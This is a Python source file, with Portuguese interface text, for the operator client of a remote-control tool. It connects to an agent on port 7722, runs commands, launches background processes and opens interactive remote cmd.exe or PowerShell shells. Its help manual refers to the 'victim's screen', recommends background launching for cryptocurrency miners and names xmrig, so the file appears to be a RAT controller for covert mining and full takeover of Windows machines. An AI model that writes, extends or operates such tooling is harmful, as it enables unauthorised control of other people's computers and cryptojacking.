#!/usr/bin/env python3
import socket
import time
import threading

PORT = 7722  # Porta fixa do servidor

# ==============================================================================
# NETWORK HELPERS
# ==============================================================================

def send_command(host, port, command):
    """Envia um comando ao servidor e retorna a resposta."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15)
            s.connect((host, port))
            s.sendall(command.encode('utf-8'))
            output = ""
            while True:
                data = s.recv(4096).decode('utf-8', errors='ignore')
                if not data: break
                output += data
                if '[PROCESS ENDED]' in data: break
            return output
    except ConnectionRefusedError:
        return "[ERRO] Não foi possível conectar ao servidor."
    except socket.timeout:
        return "[ERRO] Timeout: o servidor não respondeu a tempo."
    except Exception as e:
        return f"[ERRO] Falha na comunicação: {str(e)}"

def test_connection(host, port):
    """Testa se consegue conectar ao servidor"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            result = s.connect_ex((host, port))
            return result == 0
    except:
        return False

# ==============================================================================
# INTERACTIVE SHELL
# ==============================================================================

def start_shell(host, port, command):
    """Inicia um shell interativo remoto."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(None)
        s.connect((host, port))
        
        # Envia comando de inicialização
        msg = f"SHELL:{command}"
        s.sendall(msg.encode('utf-8'))
        
        print(f"\n[SHELL] Conectado ao processo remoto: {command}")
        print("=== USE 'Ctrl+C' PARA SAIR ===")
        print("--- Saída do Processo Abaixo ---")

        stop_event = threading.Event()

        def receive_loop():
            try:
                while not stop_event.is_set():
                    data = s.recv(1024)
                    if not data:
                        print("\n[!] Conexão fechada pelo servidor.")
                        stop_event.set()
                        break
                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
            except:
                stop_event.set()

        t_recv = threading.Thread(target=receive_loop)
        t_recv.daemon = True
        t_recv.start()

        # Loop de Envio (Main Thread)
        try:
            while not stop_event.is_set():
                try:
                    user_input = input() # Aguarda Enter
                    msg = user_input + "\n"
                    s.sendall(msg.encode('utf-8'))
                except EOFError: break
        except KeyboardInterrupt:
            print("\n[!] Interrompendo sessão...")
            stop_event.set()
        
        s.close()
        print("\n=== SESSÃO ENCERRADA ===")

    except Exception as e:
        print(f"[ERRO] Falha ao iniciar shell: {e}")
    
    input("Pressione ENTER para voltar ao console...")

# ==============================================================================
# MENUS & UI
# ==============================================================================

def print_welcome():
    print("=" * 60)
    print("      CLIENTE DE CONTROLE REMOTO")
    print("=" * 60)

def print_help():
    print("\n" + "=" * 80)
    print("                 MANUAL DE COMANDOS")
    print("=" * 80)
    
    print("\n[1] COMANDOS DE EXECUÇÃO")
    print("-" * 80)
    print("  EXEC:<comando>           -> Executa, aguarda e retorna o TEXTO.")
    print("                              Ex: EXEC:ipconfig")
    print("                              Ex: EXEC:tasklist - Verifica as tarefas do Windows")
    print("                              Ex: EXEC:taskkill /PID 1234 /F - matar task com o numero PID")
    
    print("\n  START:<comando>          -> Dispara e esquece (Background). Retorna PID.")
    print("                              Ex: START:notepad.exe")
    print("                              Ideal para miners ou processos longos.")

    print("\n  SHELL:<comando>          -> Túnel Interativo (Seu melhor amigo).")
    print("                              Ex: SHELL:cmd.exe (Terminal Completo)")
    print("                              Ex: SHELL:powershell")
    print("                              Ex: SHELL: taskkill /F /IM chrome.exe - mata o chrome")
    
    print("\n  START:VISIBLE:<comando>  -> Abre na TELA DA VÍTIMA (Sessão 1).")
    print("                              Ex: START:VISIBLE:chrome.exe")

    print("\n[2] GERENCIAMENTO DE PROCESSOS")
    print("-" * 80)
    print("  LIST                     -> Lista processos iniciados pelo Agente.")
    print("  STOP:<id>                -> Para o processo pelo ID da lista.")
    print("                              ATENÇÃO: Se for um script (.bat), o programa filho")
    print("                              pode continuar rodando (zumbi).")
    print()
    print("  STOPNAME:<nome>          -> O 'Matador'. Mata TODOS com esse nome.")
    print("                              Ex: STOPNAME:xmrig  (Recomendado para limpar tudo)")
    print("                              Ex: STOPNAME:chrome")
    print()
    print("  FIND:<nome>              -> Procura PIDs rodando no sistema.")
    print("  PROCESSES                -> Lista TUDO (Pesado).")
    print()
    print("\n[3] DICAS DE OURO (SHELL INTERATIVO)")
    print("-" * 80)
    print("  Com 'SHELL:cmd.exe', você tem o controle total:")
    print("  * Ler arquivos    : type C:\\Windows\\SystemOut\\config.json")
    print("  * Criar arquivos  : echo 123 > C:\\teste.txt")
    print("  * Scripts         : call C:\\script.bat")
    print("  * PowerShell      : Digite 'powershell' dentro do shell para comandos avançados")
    print("                      (Ex: Set-Content, Add-Content)")
    
    print("\n  OBS: Erros de conexão (WinError 10054) ao fechar o Shell são normais.")
    print("       Significa apenas que o processo remoto morreu.")
    
    print("=" * 80)
    input("\nPressione ENTER para voltar...")

def command_console(host):
    print(f"\n[CONSOLE] Conectado a {host}. Digite '/menu' ou /help")
    
    while True:
        try:
            cmd = input(f"\n> ").strip()
            
            if not cmd: continue
            if cmd.lower() == '/menu':
                break
            
            if cmd.lower() == '/help':
                print("Comandos: EXEC:<comando>, START:<comando>, SHELL:<comando>, LIST, STOP:id")
                continue

            # --- SHELL MODE ---
            if cmd.upper().startswith("SHELL:"):
                target = cmd[6:].strip()
                if target:
                    start_shell(host, PORT, target)
                else:
                    print("Erro: Digite o comando. Ex: SHELL:cmd.exe")
                continue

            # --- STANDARD COMMAND ---
            start_t = time.time()
            resp = send_command(host, PORT, cmd)
            duration = time.time() - start_t
            
            print("-" * 40)
            print(resp.strip())
            print("-" * 40)
            if duration > 1.0: print(f"(Tempo: {duration:.2f}s)")

        except KeyboardInterrupt:
            print("\n")
            break

# ==============================================================================
# MAIN FLOW
# ==============================================================================

def main():
    current_host = None
    
    # Auto-detect IP from input args or default? No, user wants menu.
    
    while True:
        # Clear screen simulation? No, just print breaks.
        print("\n" * 2) 
        print_welcome()
        if current_host:
            print(f"   STATUS: CONECTADO [{current_host}]")
        else:
            print(f"   STATUS: DESCONECTADO")
        print("-" * 60)
        print("1 - Conectar IP")
        if current_host:
            print("2 - Console de Comandos")
        else:
            print("2 - Console de Comandos (Requer Conexão)")
        print("3 - Ajuda / Explicação dos Comandos")
        print("4 - Sair")
        print("-" * 60)
        
        opt = input("Opção: ").strip()
        
        if opt == '1':
            new_host = input("Digite IP do Servidor (Enter para localhost): ").strip()
            if not new_host: new_host = 'localhost'
            print(f"Testando conexão com {new_host}...")
            if test_connection(new_host, PORT):
                current_host = new_host
                print(f"[SUCESSO] Conectado a {current_host}")
                time.sleep(1)
            else:
                print(f"[ALERTA] Não foi possível contactar {new_host}. Verifique IP/Firewall.")
                current_host = None  # Reset if failed? Or keep trying? User preference. Let's reset to be safe.
                input("Enter para continuar...")

        elif opt == '2':
            if not current_host:
                print(" [!] Defina o IP na opção 1 primeiro.")
                time.sleep(1)
            else:
                command_console(current_host)

        elif opt == '3':
            print_help()

        elif opt == '4':
            print("Saindo...")
            break
            
        else:
            print("Opção inválida.")
            time.sleep(0.5)

if __name__ == "__main__":
    main()